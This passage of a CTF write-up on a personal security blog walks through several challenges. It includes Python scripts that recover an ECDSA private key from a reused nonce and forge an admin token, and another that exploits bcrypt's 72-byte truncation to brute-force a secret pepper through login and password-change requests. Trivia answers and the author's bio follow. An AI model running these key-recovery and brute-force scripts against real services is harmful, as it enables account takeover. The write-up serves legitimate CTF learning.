+</span></span><span style="display:flex;"><span>m2 <span style="color:#f92672">=</span> int(sha256(jwt2[<span style="color:#e6db74">&#34;data&#34;</span>]<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest(), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Compute k using the reused nonce formula</span>
+</span></span><span style="display:flex;"><span>numerator <span style="color:#f92672">=</span> (m1 <span style="color:#f92672">-</span> m2) <span style="color:#f92672">%</span> q
+</span></span><span style="display:flex;"><span>denominator <span style="color:#f92672">=</span> (s1 <span style="color:#f92672">-</span> s2) <span style="color:#f92672">%</span> q
+</span></span><span style="display:flex;"><span>k <span style="color:#f92672">=</span> (numerator <span style="color:#f92672">*</span> inverse(denominator, q)) <span style="color:#f92672">%</span> q
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Recovered k:&#34;</span>, k)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Recover private key x</span>
+</span></span><span style="display:flex;"><span>x <span style="color:#f92672">=</span> ((s1 <span style="color:#f92672">*</span> k <span style="color:#f92672">-</span> m1) <span style="color:#f92672">*</span> inverse(r1, q)) <span style="color:#f92672">%</span> q
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Recovered private key x:&#34;</span>, x)
+</span></span></code></pre></div><p>Executing the script got the following result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 extract_priv_key.py                                                                                                                                                                                
+</span></span><span style="display:flex;"><span>Recovered k: <span style="color:#ae81ff">115792089210356248762697446949407573529996955224135760342422259061068512044368</span>
+</span></span><span style="display:flex;"><span>Recovered private key x: <span style="color:#ae81ff">102833336941926514149702482123358695820533145036475158825316379479287364480376</span> 
+</span></span></code></pre></div><p>Using the recovered private key, I put together a Python script to generate a valid JWT by signing it with the reused <code>x</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> sha256
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ecdsa <span style="color:#f92672">import</span> SigningKey, NIST256p
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ecdsa.util <span style="color:#f92672">import</span> sigencode_string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># private key</span>
+</span></span><span style="display:flex;"><span>x <span style="color:#f92672">=</span> <span style="color:#ae81ff">102833336941926514149702482123358695820533145036475158825316379479287364480376</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;name&#34;: &#34;Lyons&#34;, &#34;admin&#34;: true}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sk <span style="color:#f92672">=</span> SigningKey<span style="color:#f92672">.</span>from_secret_exponent(x, curve<span style="color:#f92672">=</span>NIST256p, hashfunc<span style="color:#f92672">=</span>sha256)
+</span></span><span style="display:flex;"><span>sig <span style="color:#f92672">=</span> sk<span style="color:#f92672">.</span>sign(data<span style="color:#f92672">.</span>encode(), hashfunc<span style="color:#f92672">=</span>sha256, sigencode<span style="color:#f92672">=</span>sigencode_string)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(sig[:<span style="color:#ae81ff">32</span>], <span style="color:#e6db74">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(sig[<span style="color:#ae81ff">32</span>:], <span style="color:#e6db74">&#39;big&#39;</span>)
+</span></span><span style="display:flex;"><span>signature_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>r<span style="color:#e6db74">:</span><span style="color:#e6db74">064x</span><span style="color:#e6db74">}{</span>s<span style="color:#e6db74">:</span><span style="color:#e6db74">064x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;data&#34;</span>: data,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;signature&#34;</span>: signature_hex
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>token_b64 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(json<span style="color:#f92672">.</span>dumps(token)<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>print(token_b64)
+</span></span></code></pre></div><p>Executing the script got the following result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 exploit.py                                                                                                                                                                                
+</span></span><span style="display:flex;"><span>eyJkYXRhIjogIntcIm5hbWVcIjogXCJMeW9uc1wiLCBcImFkbWluXCI6IHRydWV9IiwgInNpZ25hdHVyZSI6ICJmZTNlZWI3Zjc5NDY5YTJjYWQ0YTI0ODI3NjI4ODhhNTZjYTNmZDI1OTJmOWU2MmUyMDBkMzdkMjNlMTVkY2ZkYmRiNWQzMzdlNTVkYT
+</span></span><span style="display:flex;"><span>ZmYzhlZDBhM2QxYWQwYWE5YWMzZTBiNGI0NjU0YzdkNjQ0ZTRkYjJkMGQ2MTQ4ZWQzOCJ9
+</span></span></code></pre></div><p>I tweaked the JWT in the web app, and that got me the flag.</p>
+<figure class="post-image"><img src="/oposec_2025/date8.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>if_not_rand0m_why_rand0m_sh4ped?<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="spicy">Spicy</h3>
+<figure class="post-image"><img src="/oposec_2025/spicy.png">
+</figure>
+
+<p>The URL led to a web app where I could either log in or register.</p>
+<figure class="post-image"><img src="/oposec_2025/spicy2.png">
+</figure>
+
+<p>I went ahead and created an account to log in.</p>
+<figure class="post-image"><img src="/oposec_2025/spicy3.png">
+</figure>
+
+<figure class="post-image"><img src="/oposec_2025/spicy4.png">
+</figure>
+
+<p>Right after logging in, I navigated to /flag and an admin panel appeared with an input field for a &ldquo;Magic Key&rdquo;.</p>
+<figure class="post-image"><img src="/oposec_2025/spicy5.png">
+</figure>
+
+<p>I started fuzzing the web app with FFUF and discovered a <code>/backup</code> folder.</p>
+<figure class="post-image"><img src="/oposec_2025/spicy6.png">
+</figure>
+
+<p>I used <code>wget</code> to download a file that appeared to be a zip archive.</p>
+<figure class="post-image"><img src="/oposec_2025/spicy7.png">
+</figure>
+
+<p>Once extracted, the zip revealed what looked like the source code of the web application being used in the challenge.</p>
+<figure class="post-image"><img src="/oposec_2025/spicy8.png">
+</figure>
+
+<p>The code had a lot of rabbit holes, but after some digging, I found that the web application uses bcrypt and combines the user password with the magic key.</p>
+<figure class="post-image"><img src="/oposec_2025/spicy9.png">
+</figure>
+
+<p>Reading <a href="https://github.com/pyca/bcrypt/" target="_blank">bcrypt documentation</a>
+ i&rsquo;ve noticed this:</p>
+<figure class="post-image"><img src="/oposec_2025/spicy10.png">
+</figure>
+
+<p>If I create a password with 72 characters, I can log in using that password plus extra stuff. But the code shows that a <code>PEPPER</code> is added before hashing, so <code>bcrypt_hash(password + PEPPER)</code> effectively becomes <code>bcrypt_hash(&quot;A&quot; * 72 + MAGIC_KEY)</code>, which means the <code>MAGIC_KEY</code> gets ignored.</p>
+<p>To confirm, I used Burp Suite to brute-force the login with my account, testing a password of 71 As followed by <code>[a-zA-Z0-9]</code>. I successfully logged in with 71 As + <code>e</code>, revealing that the first character is <code>e</code>.</p>
+<figure class="post-image"><img src="/oposec_2025/spicy11.png">
+</figure>
+
+<p>The steps to recover the PEPPER are:</p>
+<ul>
+<li>Create an account using a password of 71 characters.</li>
+<li>Attempt to log in with that password plus an extra character:
+<ul>
+<li>If it succeeds, that character is part of the PEPPER.</li>
+<li>If it fails, try a different character until it works.</li>
+</ul>
+</li>
+<li>Once logged in, change the current password from 71 characters to 70 characters.</li>
+<li>Repeat the login attempts using the previous password + known PEPPER characters + a new character.</li>
+<li>Continue this process until all characters of the PEPPER are discovered.</li>
+</ul>
+<p>I wrote a Python script to automate these steps, making the process of discovering the PEPPER much simpler and faster.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> string <span style="color:#f92672">import</span> ascii_letters, digits
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://spicy.0d.al&#34;</span>
+</span></span><span style="display:flex;"><span>USERNAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;nnn&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>CHARSET <span style="color:#f92672">=</span> ascii_letters <span style="color:#f92672">+</span> digits
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>(password: str) <span style="color:#f92672">-&gt;</span> bool:
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/login/&#34;</span>, data<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;username&#34;</span>: USERNAME,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;password&#34;</span>: password,
+</span></span><span style="display:flex;"><span>    }, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">in</span> (<span style="color:#ae81ff">302</span>, <span style="color:#ae81ff">303</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">change_password</span>(old_password: str, new_password: str) <span style="color:#f92672">-&gt;</span> bool:
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>URL<span style="color:#e6db74">}</span><span style="color:#e6db74">/password_change/&#34;</span>, data<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;old_password&#34;</span>: old_password,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;new_password1&#34;</span>: new_password,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;new_password2&#34;</span>: new_password,
+</span></span><span style="display:flex;"><span>    }, allow_redirects<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">in</span> (<span style="color:#ae81ff">302</span>, <span style="color:#ae81ff">303</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recover_pepper</span>():
+</span></span><span style="display:flex;"><span>    pepper <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    num_b_prefix <span style="color:#f92672">=</span> <span style="color:#ae81ff">71</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    current_server_password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">71</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> login(current_server_password):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[-] Error - login&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> num_b_prefix <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        found_char <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> num_b_prefix
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> CHARSET:
+</span></span><span style="display:flex;"><span>            test_password <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> pepper <span style="color:#f92672">+</span> c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(test_password) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">72</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[&gt;] Trying login: </span><span style="color:#e6db74">{</span>test_password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> login(test_password):
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># Ok we have found the next valid char for Pepper</span>
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[✓] Char found: &#39;</span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>)
+</span></span><span style="display:flex;"><span>                found_char <span style="color:#f92672">=</span> c
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> found_char:
+</span></span><span style="display:flex;"><span>            pepper <span style="color:#f92672">+=</span> found_char
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># We decrement the prefix to find the new Pepper&#39;s char</span>
+</span></span><span style="display:flex;"><span>            new_pw <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> (num_b_prefix <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> change_password(current_server_password, new_pw):
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Password changed to: </span><span style="color:#e6db74">{</span>new_pw<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                current_server_password <span style="color:#f92672">=</span> new_pw
+</span></span><span style="display:flex;"><span>                num_b_prefix <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;[-] Error while changing password&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> pepper
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[!] No char was found&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pepper
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    recovered_pepper <span style="color:#f92672">=</span> recover_pepper()
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Pepper: </span><span style="color:#e6db74">{</span>recovered_pepper<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>I then executed the script and found the <code>PEPPER</code> to be <code>e8isahBivzaZ39zOTG0</code></p>
+<figure class="post-image"><img src="/oposec_2025/spicy12.png">
+</figure>
+
+<p>With this <code>PEPPER</code> I was able to provide the &ldquo;Magic Key&rdquo; and get the flag.</p>
+<figure class="post-image"><img src="/oposec_2025/spicy13.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>D0nt_CrY_0v3R_S9ill3d_P3pper<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="trivia">Trivia</h2>
+<h3 id="default">Default</h3>
+<figure class="post-image"><img src="/oposec_2025/default.png">
+</figure>
+
+<p>I spent a lot of time Googling different things to solve this challenge &hellip; eventually, I decided to check who actually took the picture.</p>
+<figure class="post-image"><img src="/oposec_2025/default2.png">
+</figure>
+
+<p>I used &ldquo;Bliss&rdquo; as the flag, and it worked.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>Bliss<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="the-one">The One</h3>
+<figure class="post-image"><img src="/oposec_2025/theone.png">
+</figure>
+
+<audio controls class="">
+  <source src="/oposec_2025/boot.mp3" type="audio/mpeg">
+</audio>
+<p>We got a sound that resembled something old powering on.</p>
+<p>After a bit of digging (and some YouTube videos), I realized it was the PlayStation 1 startup sound - but that still wasn’t the flag.</p>
+<p>Then I paused to think—the phrase <em>&ldquo;what makes me tick&rdquo;</em> was in bold, so it seemed like a hint for the flag. I asked ChatGPT for guidance, and it suggested the following:</p>
+<figure class="post-image"><img src="/oposec_2025/theone2.png">
+</figure>
+
+<p>Googling the PlayStation 1 CPU model, I discovered that it uses the <strong>MIPS R3000A-compatible 32-bit RISC</strong> processor.</p>
+<p>Using <code>R3000</code> as the flag it worked!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>R3000<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h3 id="a-sweet-evolution">A Sweet Evolution</h3>
+<figure class="post-image"><img src="/oposec_2025/evol.png">
+</figure>
+
+<p>The final challenge was quite tough for me - I spent several hours on it. I tried multiple approaches to see what would make sense, and eventually I concluded that the solution might involve assigning a word to each image and then taking the first letter of each word</p>
+<ul>
+<li><code>S</code>kittles</li>
+<li><code>K</code>itkat</li>
+<li><code>?</code></li>
+<li><code>M</code>arshmallows</li>
+</ul>
+<p>After mapping a word to each image and taking the first letter, I immediately noticed that the letters formed the alphabet, with the missing letter being <code>L</code>.</p>
+<p>Since these images referred to sweet candies, I thought of a candy starting with <code>L</code> and used <strong>Lollipop</strong> as the answer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>Lollipop<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>This year I managed to finish all the challenges, though I didn&rsquo;t make it to the podium 😅. Ending up in 5th place isn&rsquo;t too bad! Already excited for the Christmas Challenge 2025!</p>
+<figure class="post-image"><img src="/oposec_2025/conclusion.png">
+</figure>
+
+
+
+        
+      </section>
+
+      
+      <div class="divider"></div>
+      <div class="flex flex-col md:flex-row justify-between gap-4 py-4">
+        
+        <div></div>
+        
+
+        
+        <a role="button" class="btn btn-outline h-12" href="/posts/2025-08-05-frontend-lies-backend-spies/" title="Frontend Lies Backend Spies - C2 Redirector">
+          <div class="inline-flex flex-col items-end">
+            <span class="text-base-content/60 text-xs font-normal">Next page</span>
+            <span class="max-w-48 truncate">Frontend Lies Backend Spies - C2 Redirector</span>
+          </div>
+          <ion-icon name="chevron-forward"></ion-icon>
+        </a>
+        
+      </div>
+      
+
+      
+    </article>
+  </div>
+
+  <div
+    x-data="tocHighlighter()"
+    @scroll.window="debouncedScroll"
+    class="hidden lg:flex lg:flex-col lg:items-end"
+  >
+    
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#a-delicious-mess">A Delicious Mess</a></li>
+        <li><a href="#matryoshka">Matryoshka</a></li>
+        <li><a href="#foreplay">Foreplay</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#the-crew">The Crew</a></li>
+        <li><a href="#you-are-not-the-admin">You Are Not the Admin</a></li>
+        <li><a href="#take-a-look-in-the-mirror-">Take a Look in the Mirror !</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#sounds-frm-another-planet">Sounds Frm Another Planet</a></li>
+        <li><a href="#2010">2010</a></li>
+        <li><a href="#spicy">Spicy</a></li>
+      </ul>
+    </li>
+    <li><a href="#trivia">Trivia</a>
+      <ul>
+        <li><a href="#default">Default</a></li>
+        <li><a href="#the-one">The One</a></li>
+        <li><a href="#a-sweet-evolution">A Sweet Evolution</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+    
+  </div>
+</div>
+
+
+            
+<footer class="flex justify-between items-center gap-2 max-w-[65ch] mx-auto px-4 md:px-0 py-12">
+
+  <div>
+  
+  <p>
+    © 2018 - 2025 Bruno Blog
+  </p>
+  
+
+  
+  <p class="text-sm">
+    🌱
+    <span class="text-base-content/60">
+      Powered by <a class="hover:underline" href="https://gohugo.io/" target="_blank">Hugo</a> with theme
+      <a class="hover:underline" href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</span
+    >
+  </p>
+  
+</div>
+
+  <div
+  x-data="{ icons: [
+    { name: 'sunny', status: 'n' },
+    { name: 'moon', status: 'y' },
+    { name: 'desktop', status: 'auto' }
+  ] }"
+  class="flex items-center gap-2 h-[32px] px-2 bg-base-100 border border-base-content/30 rounded-full"
+>
+  <template x-for="icon in icons">
+    <div
+      role="button"
+      tabindex="0"
+      :aria-label="'Select ' + icon.name + ' mode'"
+      class="group inline-flex justify-center items-center p-1 rounded-full cursor-pointer hover:bg-primary"
+      :class="$store.darkMode.icon() === icon.name && 'bg-primary'"
+      @click="$store.darkMode.toggle(icon.status)"
+    >
+      <ion-icon
+        :name="`${icon.name}-outline`"
+        class="group-hover:text-primary-content"
+        :class="$store.darkMode.icon() === icon.name && 'text-primary-content'"
+      >
+      </ion-icon>
+    </div>
+  </template>
+</div>
+
+</footer>
+
+          </div>
+        </div>
+        <div class="back">
+          <div class="container">
+            
+            <div class="max-w-[65ch] mt-8 mx-auto px-4">
+  
+  
+  
+  <div>
+    <div class="mb-4 text-lg font-medium"></div>
+
+    <div class="prose dark:prose-invert">
+      <h1 id="about-me">About me</h1>
+<p><em>My name is Bruno Teixeira and I am an Offensive Cyber Security Analyst. Focused on learning Information Security and Systems Administration. Always doing some side projects to improve my coding skills and learn new technologies on the way.</em></p>
+<h2 id="work-experience">Work Experience</h2>
+<ul>
+<li>Pentester @ <a href="https://www.pt.logicalis.com/pt-pt" target="_blank">Logicalis PT</a>
+ (Current)</li>
+<li>Pentester @ <a href="https://www.layer8.pt" target="_blank">Layer8</a>
+</li>
+<li>Offensive Cyber Security Analyst @ <a href="https://artresilia.com/" target="_blank">ArtResilia</a>
+</li>
+<li>Technical Support / Service Desk @ <a href="https://www.cgi.com/en" target="_blank">CGI</a>
+</li>
+<li>Military @ <a href="https://www.exercito.pt/pt" target="_blank">Exército Português</a>
+</li>
+</ul>
+<h2 id="education">Education</h2>
+<ul>
+<li>BsC Computer Engineering @ <a href="https://www.isec.pt" target="_blank">ISEC Coimbra</a>
+</li>
+<li>CET Network and Systems @ <a href="https://www.cinel.pt" target="_blank">CINEL Porto</a>
+</li>
+<li>IT &amp; Programming @ <a href="https://eisnt.com/" target="_blank">EISnt, High School</a>
+</li>
+</ul>
+<h2 id="work-experience-as-a-trainee">Work Experience as a Trainee</h2>
+<ul>
+<li>IT and Network department @ <a href="https://www.islagaia.pt/pt/" target="_blank">ISLA Gaia</a>
+</li>
+<li>Hardware &amp; Software Maintenance @ <a href="http://assistencia35.com/" target="_blank">Assistência 35 LDA</a>
+</li>
+<li>Hardware Maintenance @ <a href="https://www.lojasehorarios.com.pt/dotcenter-informatica-soc-unip-lda/porto/c-58637a1332cff589d8187aa3" target="_blank">DOTcenter</a>
+</li>
+</ul>
+
+    </div>
+  </div>
+  <div class="divider divider-vertical"></div>
+  
+  
+
+  
+  
+  <div class="pb-4">
+  
+    <div class="mb-4 text-lg font-medium">Social Links</div>
+
+    <ul class="menu menu-horizontal flex-wrap w-full px-0 [&_ion-icon]:text-lg">
+  
+  <li>
+    <a href="mailto:brunoalexandre3@hotmail.com" title="Email">
+      <ion-icon name="mail"></ion-icon>
+    </a>
+  </li>
+  
+
+  
+  <li>
+    <a href="https://github.com/BrunoTeixeira1996" target="_blank" title="GitHub">
+      <ion-icon name="logo-github"></ion-icon>
+    </a>
+  </li>
+  
+  <li>
+    <a href="https://x.com/zebisnaga3" target="_blank" title="X">
+      <ion-icon name="logo-x"></ion-icon>
+    </a>
+  </li>
+  
+  <li>
+    <a href="https://www.linkedin.com/in/bruno-teixeira-1553b4a1/" target="_blank" title="Linkedin">
+      <ion-icon name="logo-linkedin"></ion-icon>
+    </a>
+  </li>
+  
+</ul>
+
+  </div>
+  
+
+  
+</div>
+
+            
+
+            
+<footer class="flex justify-between items-center gap-2 max-w-[65ch] mx-auto px-4 md:px-0 py-12">
+
+  <div>
+  
+  <p>
+    © 2018 - 2025 Bruno Blog
+  </p>
+  
+
+  
+  <p class="text-sm">
+    🌱
+    <span class="text-base-content/60">
+      Powered by <a class="hover:underline" href="https://gohugo.io/" target="_blank">Hugo</a> with theme
+      <a class="hover:underline" href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</span
+    >
+  </p>
+  
+</div>
+
+  <div
+  x-data="{ icons: [
+    { name: 'sunny', status: 'n' },
+    { name: 'moon', status: 'y' },
+    { name: 'desktop', status: 'auto' }
+  ] }"
+  class="flex items-center gap-2 h-[32px] px-2 bg-base-100 border border-base-content/30 rounded-full"
+>
+  <template x-for="icon in icons">
+    <div
+      role="button"
+      tabindex="0"
+      :aria-label="'Select ' + icon.name + ' mode'"
+      class="group inline-flex justify-center items-center p-1 rounded-full cursor-pointer hover:bg-primary"
+      :class="$store.darkMode.icon() === icon.name && 'bg-primary'"
+      @click="$store.darkMode.toggle(icon.status)"
+    >
+      <ion-icon
+        :name="`${icon.name}-outline`"
+        class="group-hover:text-primary-content"
+        :class="$store.darkMode.icon() === icon.name && 'text-primary-content'"
+      >
+      </ion-icon>
+    </div>
+  </template>
+</div>
+
+</footer>
+
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+  window.lightTheme = "emerald"
+  window.darkTheme = "forest"
+</script>
+
+
+
+
+
+<script src="/js/main.js"></script>
+
+    
+
+
+
+
+
+
+
+<script src="/js/toc.js"></script>
+
+
+  
+    <script type="module">
+      import mediumZoom from 'https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/+esm';
+      mediumZoom('#dream-single-post-content img', {
+        background: 'oklch(var(--b1))',
+        margin: 24,
+      })
+    </script>
+  
+
+
+
+
+
+
+    
+
+    
+
+    
+
+    
+
+    <script type="module" src="https://cdn.jsdelivr.net/npm/ionicons@7.4.0/dist/ionicons/ionicons.esm.js" integrity="sha256-/IFmi82bIhdYWctu0UddSlJqpnzWm7Vh2C4CM32wF/k=" crossorigin="anonymous"></script>
